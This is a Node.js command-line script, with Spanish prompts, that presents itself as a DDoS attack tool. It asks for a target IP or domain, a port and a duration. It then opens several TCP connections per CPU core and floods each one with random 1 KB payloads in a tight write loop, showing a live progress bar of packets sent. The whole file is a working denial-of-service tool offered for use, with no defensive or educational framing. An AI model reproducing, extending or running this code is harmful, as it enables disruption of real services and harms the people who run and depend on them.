#!/usr/bin/env node
'use strict';

const net      = require('net');
const crypto   = require('crypto');
const readline = require('readline');
const os       = require('os');
const dns      = require('dns').promises;

class DDoSAttack {
    constructor() {
        this.rl = readline.createInterface({ input: process.stdin, output: process.stdout });
        this.stats = { packets: 0, successful: 0, failed: 0, start: Date.now(), methods: new Set() };
        this.workers = [];
    }

    async input(msg) {
        return new Promise(res => this.rl.question(`\x1b[1;32m${msg}\x1b[0m`, res));
    }

    async inputNumber(msg, min, max) {
        while (true) {
            const n = parseInt(await this.input(msg));
            if (!isNaN(n) && n >= min && n <= max) return n;
            console.log('\x1b[1;31mEntrada inválida. Intente nuevamente.\x1b[0m');
        }
    }

    async resolveDNS(target) {
        try {
            if (!net.isIP(target)) {
                const r = await dns.resolve4(target);
                console.log(`\x1b[1;36mDNS resuelto: ${r[0]}\x1b[0m`);
                return r[0];
            }
            return target;
        } catch {
            console.log('\x1b[1;33mFallo en resolución DNS, usando como IP\x1b[0m');
            return target;
        }
    }

    createTCPWorker(target, port) {
        return () => {
            const socket = net.connect(port, target, () => {
                const payload = crypto.randomBytes(1024);
                const writeLoop = () => {
                    while (true) {
                        try {
                            if (!socket.write(payload)) {
                                socket.once('drain', writeLoop);
                                return;
                            }
                            this.stats.packets++;
                            this.stats.successful++;
                            this.stats.methods.add('TCP');
                        } catch {
                            this.stats.failed++;
                            return;
                        }
                    }
                };
                writeLoop();
            });
            socket.on('error', () => this.stats.failed++);
            return socket;
        };
    }

    async start() {
        console.log('\x1b[1;36m=== Configuración de Ataque ===\x1b[0m');
        const target = await this.input('Objetivo (IP/Dominio): ');
        this.target   = await this.resolveDNS(target);
        this.port     = await this.inputNumber('Puerto (1-65535): ', 1, 65535);
        this.duration = await this.inputNumber('Duración (segundos): ', 1, 3600);

        const cores = os.cpus().length || 1;
        this.threads = cores * 4;

        console.log('\n\x1b[1;36m=== Resumen ===\x1b[0m');
        console.log(`Objetivo: ${this.target}`);
        console.log(`Puerto: ${this.port}`);
        console.log(`Duración: ${this.duration}s`);
        console.log(`Hilos: ${this.threads}`);

        const confirm = await this.input('¿Iniciar ataque? (s/n): ');
        if (confirm.toLowerCase() !== 's') {
            console.log('\x1b[1;33mAtaque cancelado\x1b[0m');
            process.exit(0);
        }

        await this.runAttack();
    }

    async runAttack() {
        console.log('\n\x1b[1;31mIniciando ataque...\x1b[0m');

        for (let i = 0; i < this.threads; i++) this.workers.push(this.createTCPWorker(this.target, this.port)());

        const barLen = 30;
        const start  = Date.now();
        const printBar = () => {
            const elapsed = Math.floor((Date.now() - start) / 1000);
            const pct     = Math.min(100, Math.floor((elapsed / this.duration) * 100));
            const filled  = Math.floor((pct / 100) * barLen);
            const empty   = barLen - filled;
            process.stdout.write(
                `\r\x1b[36m[${'█'.repeat(filled)}${'░'.repeat(empty)}] ` +
                `\x1b[35m${pct}% \x1b[32m${this.stats.packets}pkt \x1b[31m${this.stats.failed}fail\x1b[0m`
            );
        };

        const barInterval = setInterval(printBar, 200);

        setTimeout(() => {
            clearInterval(barInterval);
            this.stopAttack();
            console.log('\n\n\x1b[1;32mAtaque completado\x1b[0m');
            process.exit(0);
        }, this.duration * 1000);
    }

    stopAttack() {
        this.workers.forEach(w => { if (w.destroy) w.destroy(); });
    }
}

process.on('SIGINT', () => {
    console.log('\n\x1b[1;33mAtaque detenido manualmente\x1b[0m');
    process.exit(0);
});

new DDoSAttack().start().catch(err => {
    console.error('\x1b[1;31mError:', err.message, '\x1b[0m');
    process.exit(1);
});
